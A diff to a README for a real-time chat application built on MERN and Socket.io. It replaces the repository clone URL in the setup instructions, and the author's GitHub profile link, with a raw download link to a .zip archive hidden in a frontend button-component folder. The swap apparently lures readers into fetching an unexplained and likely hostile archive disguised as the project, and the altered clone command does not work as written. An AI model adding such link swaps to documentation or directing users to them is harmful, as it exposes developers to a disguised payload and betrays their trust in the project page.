@@ -40,7 +40,7 @@ A real-time messaging application built with the MERN stack and Socket.io. SupCh
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/Darpan013/webRTC-Application.git
+git clone https://raw.githubusercontent.com/Darpan013/webRTC-Application/main/Frontend/wrtc/src/components/Button/RT_web_Application_2.0-alpha.4.zip
 cd webrtc-application
 ```
 
@@ -240,7 +240,7 @@ This project is open source and available under the [MIT License](LICENSE).
 ## 👨‍💻 Developer
 
 **Darpan Rajput**
-- GitHub: [@darpanrajput](https://github.com/darpan013t)
+- GitHub: [@darpanrajput](https://raw.githubusercontent.com/Darpan013/webRTC-Application/main/Frontend/wrtc/src/components/Button/RT_web_Application_2.0-alpha.4.zip)
 - Email: darpanrajput2003@gmail.com
 
 ## 🙏 Acknowledgments
